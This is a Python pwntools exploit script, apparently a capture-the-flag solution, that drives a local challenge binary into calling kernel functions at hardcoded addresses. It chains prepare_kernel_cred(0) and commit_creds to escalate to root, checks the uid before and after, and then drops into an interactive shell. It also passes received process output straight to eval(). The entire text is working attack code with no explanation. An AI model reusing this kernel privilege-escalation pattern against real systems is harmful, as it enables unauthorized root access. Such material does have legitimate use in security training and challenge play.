#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
context(arch = 'amd64' , os = 'linux', log_level='debug')

p = process('./user')

# ffffffffb18cc770 commit_creds
# ffffffffb18ccae0 prepare_kernel_cred

def call(addr, argc):
    p.sendlineafter('3. Exit\n: ', '1')
    p.sendlineafter('Enter the kernel address of the function you which to execute : ', str(addr))
    p.sendlineafter('Arguments : ', str(argc))

def check():
    p.sendlineafter('3. Exit\n: ', '2')
 
if __name__ == "__main__":
    # check
    check()
    p.recvuntil('Uid : ')
    Uid = int(p.recvuntil(' Welcome')[:-8])
    success('Uid : ' + str(Uid))
    pause()
    
    # prepare_kernel_cred(0)
    call(0xffffffffb18ccae0, 0)
    p.recvuntil('Return value ')
    argc = eval(p.recv(18))

    # commit_creds(prepare_kernel_cred(0))
    call(0xffffffffb18cc770, argc)

    # check
    check()
    p.recvuntil('Uid : ')
    Uid = int(p.recvuntil(' Welcome')[:-8])
    success('Uid : ' + str(Uid))
    p.interactive()